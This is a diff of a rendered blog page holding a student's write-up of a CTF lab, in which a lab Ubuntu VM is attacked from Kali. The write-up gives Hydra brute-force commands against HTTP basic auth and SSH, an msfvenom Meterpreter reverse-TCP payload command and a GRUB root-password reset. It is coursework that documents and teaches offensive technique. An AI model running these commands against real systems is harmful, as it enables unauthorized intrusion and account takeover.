@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en" dir="auto">
 
-<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=39857&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="noindex, nofollow">
@@ -9,6 +9,7 @@
 <meta name="keywords" content="linux, it sec, school, red team, ctf">
 <meta name="description" content="
 Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found here along with the bibliography.
+
 
 Ethical hacking of a CTF-VM
 
@@ -69,17 +70,17 @@ References
 
 Task definition
 This task is based on a Capture the Flag (CTF) challenge, where multiple flags are hidden across an environment and can be found either through exploits or by navigating the system. Two virtual machines are provided: an Ubuntu server, which hosts the flags, and a Kali Linux machine for offensive actions. Both machines operate in a Host-only network, meaning they can communicate with each other but not with the external internet or other devices.">
-<meta name="author" content="stefi">
-<link rel="canonical" href="http://localhost:1313/posts/itsi/year-3/exercise-7/babys-first-ctf/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.93f625d739f1d6a5c6f20c146bc6a8d26b233492b34b2220c54b12fd46a04ded.css" integrity="sha256-k/Yl1znx1qXG8gwUa8ao0msjNJKzSyIgxUsS/UagTe0=" rel="preload stylesheet" as="style">
-<link rel="icon" href="http://localhost:1313/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
-<link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png">
-<link rel="mask-icon" href="http://localhost:1313/safari-pinned-tab.svg">
+<meta name="author" content="veya">
+<link rel="canonical" href="http://localhost:39857/posts/itsi/year-3/exercise-7/babys-first-ctf/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css" integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF&#43;13Dyqob6ASlTrTye8=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:39857/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:39857/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:39857/favicon-32x32.png">
+<link rel="apple-touch-icon" href="http://localhost:39857/apple-touch-icon.png">
+<link rel="mask-icon" href="http://localhost:39857/safari-pinned-tab.svg">
 <meta name="theme-color" content="#2e2e33">
 <meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="http://localhost:1313/posts/itsi/year-3/exercise-7/babys-first-ctf/">
+<link rel="alternate" hreflang="en" href="http://localhost:39857/posts/itsi/year-3/exercise-7/babys-first-ctf/">
 <noscript>
     <style>
         #theme-toggle,
@@ -134,7 +135,7 @@ This task is based on a Capture the Flag (CTF) challenge, where multiple flags a
 <header class="header">
     <nav class="nav">
         <div class="logo">
-            <a href="http://localhost:1313/" accesskey="h" title="silly blog (Alt + H)">silly blog</a>
+            <a href="http://localhost:39857/" accesskey="h" title="silly blog (Alt + H)">silly blog</a>
             <div class="logo-switches">
                 <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
                     <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
@@ -160,17 +161,17 @@ This task is based on a Capture the Flag (CTF) challenge, where multiple flags a
         </div>
         <ul id="menu">
             <li>
-                <a href="http://localhost:1313/about/" title="About">
+                <a href="http://localhost:39857/about/" title="About">
                     <span>About</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/posts/" title="Posts">
+                <a href="http://localhost:39857/posts/" title="Posts">
                     <span>Posts</span>
                 </a>
             </li>
             <li>
-                <a href="http://localhost:1313/" title="root">
+                <a href="http://localhost:39857/" title="root">
                     <span>root</span>
                 </a>
             </li>
@@ -185,12 +186,13 @@ This task is based on a Capture the Flag (CTF) challenge, where multiple flags a
     <h1 class="post-title entry-hint-parent">
       Babys first CTF
     </h1>
-    <div class="post-meta"><span title='2025-01-20 03:33:09 +0100 CET'>January 20, 2025</span>&nbsp;·&nbsp;17 min&nbsp;·&nbsp;stefi
+    <div class="post-meta"><span title='2025-01-20 03:33:09 +0100 CET'>January 20, 2025</span>&nbsp;·&nbsp;17 min&nbsp;·&nbsp;veya
 
 </div>
   </header> 
   <div class="post-content"><blockquote>
-<p>Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/UE7_CTF.pdf">here</a> along with the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/quellen.bib">bibliography</a>.</p></blockquote>
+<p>Note: this was converted from LaTeX to Markdown using ChatGPT 4.1. The original PDF can be found <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/UE7_CTF.pdf">here</a> along with the <a href="https://github.com/Stefanistkuhl/goobering/blob/master/itsi/y3/ex7/quellen.bib">bibliography</a>.</p>
+</blockquote>
 <hr>
 <h1 id="ethical-hacking-of-a-ctf-vm">Ethical hacking of a CTF-VM<a hidden class="anchor" aria-hidden="true" href="#ethical-hacking-of-a-ctf-vm">#</a></h1>
 <hr>
@@ -256,7 +258,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <h2 id="summary">Summary<a hidden class="anchor" aria-hidden="true" href="#summary">#</a></h2>
 <p>In this exercise, we had to break into a Linux server VM and find six hidden flags. To gain access, we first scanned the network with <code>nmap</code> and discovered four web servers. One of these required brute-forcing to retrieve the first flag, which then allowed us to gain a web shell to the system. Using the web shell, we brute-forced the password for the current user to SSH into the machine. Once logged in, we explored the system to find flags.</p>
 <p>We discovered a flag in the comments of the server&rsquo;s <code>python</code> file, which we found by inspecting the running processes. The file was intended to run as a process, and this led us to locate it. Additionally, we found flags in the history of another user who had permission to view <code>secret_flag.txt</code> in the <code>/opt</code> directory, as well as one flag in the <code>/tmp</code> directory. There are actually seven flags in total, with one located in the home directory of <code>/root</code>.</p>
-<p>We attempted to gain root access using the Linux Smart Enumeration tool and by analyzing the results for potential privilege escalation vectors, such as SUID binaries or binaries we could run with <code>sudo</code> to escalate to a shell. We also tried using a getshell from meterpreter to gain access, but none of these methods worked. As a result, we edited the boot configurations in the VM itself to get a shell and then changed the root password. This allowed us to execute the CTF setup script and view the final flag in the root&rsquo;s home directory.<!-- raw HTML omitted -->ChatGPT<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup><!-- raw HTML omitted --></p>
+<p>We attempted to gain root access using the Linux Smart Enumeration tool and by analyzing the results for potential privilege escalation vectors, such as SUID binaries or binaries we could run with <code>sudo</code> to escalate to a shell. We also tried using a getshell from meterpreter to gain access, but none of these methods worked. As a result, we edited the boot configurations in the VM itself to get a shell and then changed the root password. This allowed us to execute the CTF setup script and view the final flag in the root&rsquo;s home directory.<cite>ChatGPT<sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></cite></p>
 <hr>
 <h2 id="complete-network-topology-of-the-exercise">Complete network topology of the exercise<a hidden class="anchor" aria-hidden="true" href="#complete-network-topology-of-the-exercise">#</a></h2>
 <figure>
@@ -291,7 +293,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 
 <hr>
 <h3 id="reconnaissance-scanning-the-network">Reconnaissance: Scanning the Network<a hidden class="anchor" aria-hidden="true" href="#reconnaissance-scanning-the-network">#</a></h3>
-<p>We use the Cyber Kill Chain to structure our steps for completing the CTF, with any attack beginning with reconnaissance, which in this case means scanning the network with <code>nmap</code>.<!-- raw HTML omitted -->Lockheed Martin<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup><!-- raw HTML omitted --> Since we don&rsquo;t know the IP address of the target server yet, we need to scan the network to find it. For this, the command <code>nmap 192.168.15.0/24</code> is used to scan the entire network for open ports, as illustrated in Figure 5.</p>
+<p>We use the Cyber Kill Chain to structure our steps for completing the CTF, with any attack beginning with reconnaissance, which in this case means scanning the network with <code>nmap</code>.<cite>Lockheed Martin<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup></cite> Since we don&rsquo;t know the IP address of the target server yet, we need to scan the network to find it. For this, the command <code>nmap 192.168.15.0/24</code> is used to scan the entire network for open ports, as illustrated in Figure 5.</p>
 <figure>
     <img loading="lazy" src="/itsi/y3/ex7/images/firstnmapscan.png"/> <figcaption>
             Figure 5: Results of the nmap scan
@@ -299,7 +301,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 </figure>
 
 <p>We can determine that the target has the IP address <code>192.168.15.3</code>, since <code>.1</code> is the network address, <code>.2</code> is the DHCP server, and <code>.4</code> is the IP address of the Kali VM. This can be verified by running <code>ip a</code> or by scanning the open ports, since <code>ssh</code> is not exposed.</p>
-<p>Now we can run another <code>nmap</code> scan to get further information about the running services and their version by using the <code>-sV</code> flag and the <code>-T4</code> flag for aggressive timing, and the <code>-p-</code> value to scan all ports.<!-- raw HTML omitted -->Nmap Version Detection<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->Nmap Timing<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup><!-- raw HTML omitted --> The results of the scan can be seen in Figure 6.</p>
+<p>Now we can run another <code>nmap</code> scan to get further information about the running services and their version by using the <code>-sV</code> flag and the <code>-T4</code> flag for aggressive timing, and the <code>-p-</code> value to scan all ports.<cite>Nmap Version Detection<sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup></cite><cite>Nmap Timing<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup></cite> The results of the scan can be seen in Figure 6.</p>
 <figure>
     <img loading="lazy" src="/itsi/y3/ex7/images/nmapfr.png"/> <figcaption>
             Figure 6: Results of the detailed nmap scan
@@ -345,10 +347,10 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 
 <hr>
 <h3 id="weaponization-evaluating-the-needed-tools">Weaponization: Evaluating the needed tools<a hidden class="anchor" aria-hidden="true" href="#weaponization-evaluating-the-needed-tools">#</a></h3>
-<p>Now that we know the username and that it uses HTTP Basic Authentication, we can use Hydra to brute-force the password. For this, I have chosen the 10-million-password list as our wordlist.<!-- raw HTML omitted -->pw-list<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup><!-- raw HTML omitted --></p>
+<p>Now that we know the username and that it uses HTTP Basic Authentication, we can use Hydra to brute-force the password. For this, I have chosen the 10-million-password list as our wordlist.<cite>pw-list<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup></cite></p>
 <hr>
 <h3 id="exploitation-using-hydra-to-break-http-basic-authentication">Exploitation: Using Hydra to break HTTP basic authentication<a hidden class="anchor" aria-hidden="true" href="#exploitation-using-hydra-to-break-http-basic-authentication">#</a></h3>
-<p>To brute force the password, the following <code>hydra</code> command will be used: <code>hydra -l user -P pw.txt -s 55487 -f 192.168.15.3 http-get /</code><!-- raw HTML omitted -->hydra-http-basic-auth<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup><!-- raw HTML omitted --></p>
+<p>To brute force the password, the following <code>hydra</code> command will be used: <code>hydra -l user -P pw.txt -s 55487 -f 192.168.15.3 http-get /</code><cite>hydra-http-basic-auth<sup id="fnref:6"><a href="#fn:6" class="footnote-ref" role="doc-noteref">6</a></sup></cite></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-l user <span style="color:#75715e">#specifying the username to attempt logging in with</span>
 </span></span><span style="display:flex;"><span>-P pw.txt <span style="color:#75715e">#tells Hydra to use the contents of pw.txt as passwords to try</span>
 </span></span><span style="display:flex;"><span>-s <span style="color:#ae81ff">55487</span> <span style="color:#75715e">#specifying the port to connect to</span>
@@ -372,7 +374,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <p>Besides the flag, there is a webshell on the site, so we can run commands on the server. However, interacting through the website is a horrible experience, and that&rsquo;s why we used the command <code>whoami</code> to find out which user we are logged in as so we can SSH into the server instead.</p>
 <hr>
 <h3 id="exploitation-using-hydra-to-brute-force-ssh-login">Exploitation: Using Hydra to brute force SSH login<a hidden class="anchor" aria-hidden="true" href="#exploitation-using-hydra-to-brute-force-ssh-login">#</a></h3>
-<p>To brute force the SSH login, this Hydra command is used: <code>hydra -l GrumpyCat -P pw.txt 192.168.15.3 ssh -t 4</code>.<!-- raw HTML omitted -->hydra-ssh<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup><!-- raw HTML omitted --> The only changes made to the command are the username we got through the webshell, replacing the method with SSH, and using the <code>-t</code> flag with a value of 4 to set the max tasks to 4, since some SSH configurations tend to block higher counts. Figure 13 shows the command output.</p>
+<p>To brute force the SSH login, this Hydra command is used: <code>hydra -l GrumpyCat -P pw.txt 192.168.15.3 ssh -t 4</code>.<cite>hydra-ssh<sup id="fnref:7"><a href="#fn:7" class="footnote-ref" role="doc-noteref">7</a></sup></cite> The only changes made to the command are the username we got through the webshell, replacing the method with SSH, and using the <code>-t</code> flag with a value of 4 to set the max tasks to 4, since some SSH configurations tend to block higher counts. Figure 13 shows the command output.</p>
 <figure>
     <img loading="lazy" src="/itsi/y3/ex7/images/hydrassh.png"/> <figcaption>
             Figure 13: Getting the credentials for the user GrumpyCat
@@ -382,7 +384,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <hr>
 <h3 id="exploring-the-system">Exploring the system<a hidden class="anchor" aria-hidden="true" href="#exploring-the-system">#</a></h3>
 <h4 id="listing-all-the-files">Listing all the files<a hidden class="anchor" aria-hidden="true" href="#listing-all-the-files">#</a></h4>
-<p>Now that we have a shell in the server, it&rsquo;s time to dig around and explore. We started by running <code>ls -R / * 2&gt;/dev/null | grep flag</code>, in which the <code>-R</code> flag is used to recursively list all the files in the root of the file system and the <code>*</code> is used to list everything inside that as well. Lastly, the <code>2&gt;/dev/null</code> redirects <code>stderr</code> to the file <code>/dev/null</code> to effectively delete them from the output, which is piped into <code>grep</code> to filter it to search for files that have <code>flag</code> in their name.<!-- raw HTML omitted -->stderr<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup><!-- raw HTML omitted --> To tidy up the output, it can be piped into <code>grep</code> again with the <code>-v</code> flag to exclude results that contain <code>flags</code>. Figure 14 shows the results.</p>
+<p>Now that we have a shell in the server, it&rsquo;s time to dig around and explore. We started by running <code>ls -R / * 2&gt;/dev/null | grep flag</code>, in which the <code>-R</code> flag is used to recursively list all the files in the root of the file system and the <code>*</code> is used to list everything inside that as well. Lastly, the <code>2&gt;/dev/null</code> redirects <code>stderr</code> to the file <code>/dev/null</code> to effectively delete them from the output, which is piped into <code>grep</code> to filter it to search for files that have <code>flag</code> in their name.<cite>stderr<sup id="fnref:8"><a href="#fn:8" class="footnote-ref" role="doc-noteref">8</a></sup></cite> To tidy up the output, it can be piped into <code>grep</code> again with the <code>-v</code> flag to exclude results that contain <code>flags</code>. Figure 14 shows the results.</p>
 <figure>
     <img loading="lazy" src="/itsi/y3/ex7/images/searchingfor%20falgfiles.png"/> <figcaption>
             Figure 14: Output of the search command
@@ -456,7 +458,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 
 <hr>
 <h4 id="exploring-the-new-user">Exploring the new user<a hidden class="anchor" aria-hidden="true" href="#exploring-the-new-user">#</a></h4>
-<p>Since we are in a new user, it&rsquo;s time to rerun old commands and see if any new files can be found. Instead of using <code>ls</code> and <code>grep</code> to search, we will use the following <code>find</code> command: <code>find / -type f -name '*flag*' 2&gt;/dev/null</code>.<!-- raw HTML omitted -->find<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup><!-- raw HTML omitted --> Here is a breakdown of the command used in Figure 23:</p>
+<p>Since we are in a new user, it&rsquo;s time to rerun old commands and see if any new files can be found. Instead of using <code>ls</code> and <code>grep</code> to search, we will use the following <code>find</code> command: <code>find / -type f -name '*flag*' 2&gt;/dev/null</code>.<cite>find<sup id="fnref:9"><a href="#fn:9" class="footnote-ref" role="doc-noteref">9</a></sup></cite> Here is a breakdown of the command used in Figure 23:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / <span style="color:#75715e">#Selecting the / directory to search in</span>
 </span></span><span style="display:flex;"><span>-type f <span style="color:#75715e">#Restricts the command to only search files</span>
 </span></span><span style="display:flex;"><span>-name <span style="color:#e6db74">&#39;*flag*&#39;</span> <span style="color:#75715e">#Specifies that the command should only search files that contain &#34;flag&#34;</span>
@@ -475,7 +477,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 </p>
 <hr>
 <h4 id="finding-the-history-flag">Finding the history flag<a hidden class="anchor" aria-hidden="true" href="#finding-the-history-flag">#</a></h4>
-<p>Additionally to the find command, I remembered reading in a CTF cheat sheet a while ago to check the command history of the user. However, I initially only checked <code>.bash_history</code> instead of the <code>.history</code> file, which contains a flag in this CTF.<!-- raw HTML omitted -->enumeration-walkthough<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup><!-- raw HTML omitted --> I always missed it until I ran <code>ls -l</code> as a sanity check in the home directory of CheerfulOtter and found the flag, as shown in Figures 25 and 26.</p>
+<p>Additionally to the find command, I remembered reading in a CTF cheat sheet a while ago to check the command history of the user. However, I initially only checked <code>.bash_history</code> instead of the <code>.history</code> file, which contains a flag in this CTF.<cite>enumeration-walkthough<sup id="fnref:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup></cite> I always missed it until I ran <code>ls -l</code> as a sanity check in the home directory of CheerfulOtter and found the flag, as shown in Figures 25 and 26.</p>
 <p><figure>
     <img loading="lazy" src="/itsi/y3/ex7/images/colsal.png"/> <figcaption>
             Figure 25: Viewing the home directories of CheerfulOtter
@@ -503,22 +505,22 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 <p>No, it&rsquo;s not over yet. In an email, Professor Zivkovic stated that for flag 6, root access is needed. This means that either he made a mistake in counting, forgot about one, or there is a 7th flag that requires root privileges. Spoiler alert: it was the latter. So, the next section will be about escalating the privileges to get to that point.</p>
 <hr>
 <h3 id="privilege-escalation-on-linux">Privilege escalation on Linux<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation-on-linux">#</a></h3>
-<p>If you want to escalate your privileges on Linux, you have five options, which are the following:<!-- raw HTML omitted -->priv-esc-overview<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup><!-- raw HTML omitted --></p>
+<p>If you want to escalate your privileges on Linux, you have five options, which are the following:<cite>priv-esc-overview<sup id="fnref:11"><a href="#fn:11" class="footnote-ref" role="doc-noteref">11</a></sup></cite></p>
 <ol>
-<li>Find an exploit for the version of the kernel that is running.<!-- raw HTML omitted -->kernel-exploit<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup><!-- raw HTML omitted --></li>
-<li>Find a SUID binary that runs with the owner&rsquo;s permissions.<!-- raw HTML omitted -->suid<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup><!-- raw HTML omitted --></li>
-<li>Escalate to a shell in a usable command with <code>sudo</code>.<!-- raw HTML omitted -->sudo-exploit<sup id="fnref:14"><a href="#fn:14" class="footnote-ref" role="doc-noteref">14</a></sup><!-- raw HTML omitted --></li>
-<li>Find writable files that run at startup, like <code>crontab</code>, or other misconfigurations in the system.<!-- raw HTML omitted -->enumeration-walkthough<sup id="fnref1:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup><!-- raw HTML omitted --></li>
+<li>Find an exploit for the version of the kernel that is running.<cite>kernel-exploit<sup id="fnref:12"><a href="#fn:12" class="footnote-ref" role="doc-noteref">12</a></sup></cite></li>
+<li>Find a SUID binary that runs with the owner&rsquo;s permissions.<cite>suid<sup id="fnref:13"><a href="#fn:13" class="footnote-ref" role="doc-noteref">13</a></sup></cite></li>
+<li>Escalate to a shell in a usable command with <code>sudo</code>.<cite>sudo-exploit<sup id="fnref:14"><a href="#fn:14" class="footnote-ref" role="doc-noteref">14</a></sup></cite></li>
+<li>Find writable files that run at startup, like <code>crontab</code>, or other misconfigurations in the system.<cite>enumeration-walkthough<sup id="fnref1:10"><a href="#fn:10" class="footnote-ref" role="doc-noteref">10</a></sup></cite></li>
 <li>Find an attachable process that is running as root.</li>
 </ol>
 <h4 id="using-a-smart-enumeration-tool">Using a smart enumeration tool<a hidden class="anchor" aria-hidden="true" href="#using-a-smart-enumeration-tool">#</a></h4>
-<p>To quickly and effortlessly gather information about possible attack vectors for privilege escalation, there are tools such as <code>linux-smart-enumeration</code> to do the job for you.<!-- raw HTML omitted -->lse<sup id="fnref:15"><a href="#fn:15" class="footnote-ref" role="doc-noteref">15</a></sup><!-- raw HTML omitted --> After running the script on both users, we found that there were no attack vectors we could exploit. We discovered an empty backup file in the following location: <code>/snap/docker/2963/usr/share/man/man8/zstreamdump.8.gz</code>, and a <code>screen</code> session by the root user which we could not attach to. Additionally, the binaries <code>/snap/snapd/23545/usr/lib/snapd/snap-confine</code> and <code>/snap/snapd/23258/usr/lib/snapd/snap-confine</code> run as root, but the only available exploit for them has been patched for years. Furthermore, the only command we could run with elevated privileges is <code>cat /opt/secret_flag.txt</code>, which does not allow us to escalate to the command line interface (CLI). Lastly, not a single cron file was writable, nor were we able to view configuration files such as <code>/etc/sudoers</code>, which means there is no way to get root privileges on the system.</p>
+<p>To quickly and effortlessly gather information about possible attack vectors for privilege escalation, there are tools such as <code>linux-smart-enumeration</code> to do the job for you.<cite>lse<sup id="fnref:15"><a href="#fn:15" class="footnote-ref" role="doc-noteref">15</a></sup></cite> After running the script on both users, we found that there were no attack vectors we could exploit. We discovered an empty backup file in the following location: <code>/snap/docker/2963/usr/share/man/man8/zstreamdump.8.gz</code>, and a <code>screen</code> session by the root user which we could not attach to. Additionally, the binaries <code>/snap/snapd/23545/usr/lib/snapd/snap-confine</code> and <code>/snap/snapd/23258/usr/lib/snapd/snap-confine</code> run as root, but the only available exploit for them has been patched for years. Furthermore, the only command we could run with elevated privileges is <code>cat /opt/secret_flag.txt</code>, which does not allow us to escalate to the command line interface (CLI). Lastly, not a single cron file was writable, nor were we able to view configuration files such as <code>/etc/sudoers</code>, which means there is no way to get root privileges on the system.</p>
 <h4 id="trying-a-kernel-level-exploit">Trying a kernel level exploit<a hidden class="anchor" aria-hidden="true" href="#trying-a-kernel-level-exploit">#</a></h4>
-<p>We also tried a kernel exploit from exploit-db out of desperation, which failed at compiling.<!-- raw HTML omitted -->exploitdb<sup id="fnref:16"><a href="#fn:16" class="footnote-ref" role="doc-noteref">16</a></sup><!-- raw HTML omitted --></p>
+<p>We also tried a kernel exploit from exploit-db out of desperation, which failed at compiling.<cite>exploitdb<sup id="fnref:16"><a href="#fn:16" class="footnote-ref" role="doc-noteref">16</a></sup></cite></p>
 <h4 id="trying-to-get-privileges-using-metasploit-and-meterpreter">Trying to get privileges using Metasploit and Meterpreter<a hidden class="anchor" aria-hidden="true" href="#trying-to-get-privileges-using-metasploit-and-meterpreter">#</a></h4>
-<p>Lastly, we tried to use Meterpreter and its prebuilt privilege escalation modules.<!-- raw HTML omitted -->linux-reverse-tcp<sup id="fnref:17"><a href="#fn:17" class="footnote-ref" role="doc-noteref">17</a></sup><!-- raw HTML omitted --><!-- raw HTML omitted -->metasploit-local-exploiter-suggestor<sup id="fnref:18"><a href="#fn:18" class="footnote-ref" role="doc-noteref">18</a></sup><!-- raw HTML omitted --></p>
+<p>Lastly, we tried to use Meterpreter and its prebuilt privilege escalation modules.<cite>linux-reverse-tcp<sup id="fnref:17"><a href="#fn:17" class="footnote-ref" role="doc-noteref">17</a></sup></cite><cite>metasploit-local-exploiter-suggestor<sup id="fnref:18"><a href="#fn:18" class="footnote-ref" role="doc-noteref">18</a></sup></cite></p>
 <p>To do this, we had to generate a payload first. The payload was generated with the following command:<br>
-<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f elf -o payload.bin</code><!-- raw HTML omitted -->msfvenomdocs<sup id="fnref:19"><a href="#fn:19" class="footnote-ref" role="doc-noteref">19</a></sup><!-- raw HTML omitted --></p>
+<code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f elf -o payload.bin</code><cite>msfvenomdocs<sup id="fnref:19"><a href="#fn:19" class="footnote-ref" role="doc-noteref">19</a></sup></cite></p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>-p linux/x86/meterpreter/reverse_tcp <span style="color:#75715e">#setting the payload to be reverse TCP for Linux x86</span>
 </span></span><span style="display:flex;"><span>LHOST<span style="color:#f92672">=[</span>IP<span style="color:#f92672">]</span> <span style="color:#75715e"># sets IP address of the attacking machine</span>
 </span></span><span style="display:flex;"><span>LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> <span style="color:#75715e">#sets the local port to listen for a connection</span>
@@ -559,7 +561,7 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 
 <hr>
 <h3 id="getting-root-access-through-editing-the-grub-boot-options">Getting root access through editing the GRUB boot options<a hidden class="anchor" aria-hidden="true" href="#getting-root-access-through-editing-the-grub-boot-options">#</a></h3>
-<p>Since we weren&rsquo;t able to gain access, we resorted to the good old and reliable GRUB root password reset.<!-- raw HTML omitted -->root-grub<sup id="fnref:20"><a href="#fn:20" class="footnote-ref" role="doc-noteref">20</a></sup><!-- raw HTML omitted --></p>
+<p>Since we weren&rsquo;t able to gain access, we resorted to the good old and reliable GRUB root password reset.<cite>root-grub<sup id="fnref:20"><a href="#fn:20" class="footnote-ref" role="doc-noteref">20</a></sup></cite></p>
 <p>To use this method, the system needs to be running the GRUB boot loader, which is the default for Ubuntu.</p>
 <p>It is performed by pressing <code>e</code> when seeing the screen shown in Figure 32, which brings up the menu to edit the boot commands.</p>
 <figure>
@@ -671,18 +673,18 @@ Exercise 7: Ethical hacking of a CTF-VM<br>
 
   <footer class="post-footer">
     <ul class="post-tags">
-      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
-      <li><a href="http://localhost:1313/tags/it-sec/">It Sec</a></li>
-      <li><a href="http://localhost:1313/tags/school/">School</a></li>
-      <li><a href="http://localhost:1313/tags/red-team/">Red Team</a></li>
-      <li><a href="http://localhost:1313/tags/ctf/">Ctf</a></li>
+      <li><a href="http://localhost:39857/tags/linux/">Linux</a></li>
+      <li><a href="http://localhost:39857/tags/it-sec/">It-Sec</a></li>
+      <li><a href="http://localhost:39857/tags/school/">School</a></li>
+      <li><a href="http://localhost:39857/tags/red-team/">Red Team</a></li>
+      <li><a href="http://localhost:39857/tags/ctf/">Ctf</a></li>
     </ul>
   </footer>
 </article>
     </main>
     
 <footer class="footer">
-        <span>&copy; 2025 <a href="http://localhost:1313/">silly blog</a></span> · 
+        <span>&copy; 2025 <a href="http://localhost:39857/">silly blog</a></span> · 
 
     <span>
         Powered by
